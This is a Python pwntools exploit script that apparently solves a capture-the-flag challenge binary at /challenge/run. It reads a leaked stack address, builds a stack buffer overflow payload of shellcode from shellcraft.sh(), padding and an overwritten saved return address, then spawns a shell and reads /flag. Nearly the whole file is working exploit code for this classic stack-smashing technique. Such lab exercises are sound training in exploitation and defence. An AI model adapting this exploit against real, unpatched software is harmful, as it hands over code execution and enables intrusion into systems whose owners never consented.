#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template /challenge/run
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64', os='linux')
exe = context.binary = ELF(args.EXE or '/challenge/run')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
break interact
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    No RELRO
# Stack:    No canary found
# NX:       NX unknown - GNU_STACK missing
# PIE:      No PIE (0x400000)
# Stack:    Executable
# RWX:      Has RWX segments

io = start()

# discard debug output, something about gdb connecting
if args.GDB:
    io.recv()
# first line - welcome msg, asks for confirmation
print("[<<<] Received:-\t\t" + io.recv().decode(), end='')

payload_1 = b'Y\n'
print("[>>>>] Sending:-\t\t" + payload_1.decode(), end='')
io.send(payload_1)

# gives rsp address and takes input
rsp_line = io.recv().decode()
print("[<<<] Received:-\t\t" + rsp_line, end='')
rsp_str = rsp_line.split()[-1].replace("\n", "")
print("[O] The rsp is:-\t\t" + rsp_str)
rsp_val = int(rsp_str, base=16)

unbound_buffer = 0x7ffe33763820
saved_rip = 0x7ffe337638c8
offset = saved_rip-unbound_buffer

payload_2_shellcode = asm(shellcraft.sh()) # from pwn
payload_2_padding = b'F' * (offset - len(payload_2_shellcode)) # pad gap between end of shellcode up until saved_rip
payload_2_rip = p64(rsp_val) # in this challenge, the vuln variable is last in stack, so rsp points to the variable's location

payload_2 = payload_2_shellcode + payload_2_padding + payload_2_rip + b'\n'

io.send(payload_2)
print("[>>>>] Sending final payload...")

# root shell gained
io.send(b"cat /flag \n")

io.interactive()
